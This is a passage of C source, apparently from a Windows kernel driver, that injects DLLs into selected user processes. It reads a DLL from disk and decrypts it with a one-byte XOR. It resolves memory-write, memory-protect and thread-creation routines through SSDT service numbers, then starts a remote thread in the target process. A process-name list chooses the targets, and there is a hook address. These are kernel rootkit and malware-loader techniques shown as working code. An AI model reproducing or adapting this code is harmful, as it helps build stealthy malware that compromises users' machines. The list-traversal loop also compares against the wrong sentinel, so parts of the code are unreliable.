            }
        } else {

            OBJECT_ATTRIBUTES ob = { 0 };
            HANDLE hThread = (HANDLE) - 1;
            InitializeObjectAttributes(&ob, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
            status = NewNtCreateThreadEx(&hThread, 0x1FFFFF, &ob, ProcessHandle, MemloadBase, pParambase, NULL, 0, NULL, NULL, NULL);
            //kprintf("NewNtCreateThreadEx status:%x",status);
            if(NT_SUCCESS(status)) {
                ZwClose(hThread);
            } else {
                kprintf("[InjectDll] NewNtCreateThreadEx fail status:%x", status);
            }
        }
    HHHH:
        ZwClose(ProcessHandle);
    }
}

NTSTATUS AppendListNode(CONST WCHAR name[])
{
    PMY_PROCESS_INFO  pInfo=(PMY_PROCESS_INFO)kmalloc(sizeof(MY_PROCESS_INFO));
    if (NULL == pInfo) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    wcscpy(pInfo->exename,name);
    InsertHeadList(&g_ListProcess,(PLIST_ENTRY)&pInfo->Entry);
    return STATUS_SUCCESS;
}

BOOLEAN  IsByInjectProc(const WCHAR* name)
{
    PLIST_ENTRY p;
    BOOLEAN bret=FALSE;
    for ( p= g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink) {
        PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);
        if(_wcsicmp(pData->exename,name)==0) {
            bret=TRUE;
            break;
        }
    }
    return bret;

}

NTSTATUS MzReadFile(LPWCH pFile,PVOID* ImageBaseAddress,PULONG ImageSize)
{
    HANDLE    hDestFile=NULL;
    ULONG     ret=0;
    OBJECT_ATTRIBUTES obj_attrib;
    IO_STATUS_BLOCK Io_Status_Block = {0};
    NTSTATUS status=0;
    LARGE_INTEGER    offset = {0};
    ULONG    length = 0;
    UNICODE_STRING ustrSrcFile= {0};
    PVOID  pdata1=NULL;
    RtlInitUnicodeString(&ustrSrcFile,pFile);
    InitializeObjectAttributes(&obj_attrib,&ustrSrcFile,OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,NULL,NULL);

    status = ZwCreateFile(&hDestFile,GENERIC_READ,&obj_attrib,&Io_Status_Block,NULL,\
                          FILE_ATTRIBUTE_NORMAL,FILE_SHARE_READ,FILE_OPEN,\
                          FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);

    if(NT_SUCCESS(status)) {

        length=MzGetFileSize(hDestFile);
        if(length>0) {
            pdata1=kmalloc(length);
            if(pdata1) {
                status = ZwReadFile(hDestFile,NULL, NULL,NULL, &Io_Status_Block,pdata1,length,&offset,NULL);

                if (NT_SUCCESS(status)) {
                    *ImageSize=Io_Status_Block.Information;
                    *ImageBaseAddress=pdata1;
                    ret=status;
                } else {
                    kprintf("[MzReadFile] %ws ZwReadFile error :%x ",pFile,status);
                }


            }


        }
        ZwClose(hDestFile);

    }
    return status;
}

ULONG MzGetFileSize(HANDLE hfile)
{
    NTSTATUS ntStatus=0;
    IO_STATUS_BLOCK iostatus= {0};
    FILE_STANDARD_INFORMATION fsi= {0};
    ntStatus=ZwQueryInformationFile(hfile,&iostatus,&fsi,sizeof(FILE_STANDARD_INFORMATION),FileStandardInformation);
    if(!NT_SUCCESS(ntStatus))
        return 0;
    return fsi.EndOfFile.QuadPart;
}

void MyDecryptFile(PVOID pdata, int len)
{
    int i = 0;
    char* p1 = (char*)pdata;

    for(i = 0; i < len; i++) {
        p1[i] = 16 ^ p1[i];
    }
}


void  newWorkItem(ULONG bit)
{
    PIO_WORKITEM pIoWorkItem;
     pIoWorkItem = IoAllocateWorkItem(g_drobj);
     if (pIoWorkItem)
     {
         PWORKITEMPARAM pParam =   (PWORKITEMPARAM)kmalloc(sizeof(WORKITEMPARAM));
         if (pParam)
         {
             pParam->pid = PsGetCurrentProcessId();
             pParam->bit = bit;
             IoInitializeWorkItem(g_drobj, pIoWorkItem);
             IoQueueWorkItemEx(pIoWorkItem, (PIO_WORKITEM_ROUTINE_EX)WorkerItemRoutine, DelayedWorkQueue, pParam);
         } else
         {
             IoFreeWorkItem(pIoWorkItem);
         }
     }

}

  
VOID WorkerItemRoutine(PDEVICE_OBJECT  DeviceObject, PVOID  Context, PIO_WORKITEM IoWorkItem)
{
    NTSTATUS                    status;
    LARGE_INTEGER                localTime;
    IO_STATUS_BLOCK                ioStatus;
    FILE_BASIC_INFORMATION        flBscInfo;

    if (MmIsAddressValid(Context))
    {
        PWORKITEMPARAM pParam = (PWORKITEMPARAM)Context;
        PEPROCESS ProcessObj = NULL;
        if (NT_SUCCESS(PsLookupProcessByProcessId( pParam->pid, &ProcessObj)))
        {

                InjectDll(ProcessObj, pParam->bit);
                ObfDereferenceObject(ProcessObj);
        }

        kfree(pParam);
    }
    IoUninitializeWorkItem(IoWorkItem);
    IoFreeWorkItem(IoWorkItem);


}


void  InitGlobeFunc(PIMAGE_INFO     ImageInfo ){
	
			  if(!m_pCreateThread || !ZwProtectVirtualMemory || !fnHookfunc || !ZwWriteVirtualMemory) {
				  ZwWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwWriteVirtualMemory");
				  ZwCreateThreadEx = (TYPE_NtCreateThreadEx) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThreadEx");		  //
				  ZwCreateThread = (TYPE_NtCreateThread) GetProcAddress(ImageInfo->ImageBase, "ZwCreateThread");
				  fnHookfunc = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
				  ZwProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory) GetProcAddress(ImageInfo->ImageBase, "ZwProtectVirtualMemory");
				  m_pCreateThread = ZwCreateThreadEx == NULL ? (PVOID)ZwCreateThread : (PVOID)ZwCreateThreadEx;
				  kprintf("[InitGlobeFunc] fnHookfunc:%p ZwProtectVirtualMemory:%p m_pCreateThread:%p", fnHookfunc, ZwProtectVirtualMemory, m_pCreateThread);
	
				  if(m_pCreateThread && ZwProtectVirtualMemory && ZwWriteVirtualMemory) {
					  ULONG CreateThreadId = NULL;
					  ULONG protectvmId = NULL;
					  ULONG WriteId = NULL;
					  if(IsX64Module(ImageInfo->ImageBase) == TRUE) {
						  CreateThreadId = (ULONG)SERVICE_ID64(m_pCreateThread);
						  protectvmId = (ULONG)SERVICE_ID64(ZwProtectVirtualMemory);
						  WriteId = (ULONG)SERVICE_ID64(ZwWriteVirtualMemory);
					  } else {
						  CreateThreadId =	 SERVICE_ID32(m_pCreateThread);
						  protectvmId =   SERVICE_ID32(ZwProtectVirtualMemory);
						  WriteId = (ULONG)SERVICE_ID32(ZwWriteVirtualMemory);
					  }
	
					  if(CreateThreadId && protectvmId && WriteId) {
						  NtProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetSSDTFuncCurAddr(protectvmId);
						  NtWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetSSDTFuncCurAddr(WriteId);
						  if(m_pCreateThread == ZwCreateThreadEx) {
							  NtCreateThreadEx = (TYPE_NtCreateThreadEx)GetSSDTFuncCurAddr(CreateThreadId);
						  } else {
							  NtCreateThread = (TYPE_NtCreateThread)GetSSDTFuncCurAddr(CreateThreadId);
						  }
						  kprintf("[InitGlobeFunc] WriteId:%d CreateThreadId:%d protectvmId:%d", WriteId, CreateThreadId, protectvmId);
						  kprintf("[InitGlobeFunc] NtWriteVirtualMemory:%p NtProtectVirtualMemory:%p m_pCreateThread:%p", NtWriteVirtualMemory, NtProtectVirtualMemory, m_pCreateThread);
					  }
				  }
	
			  }


}

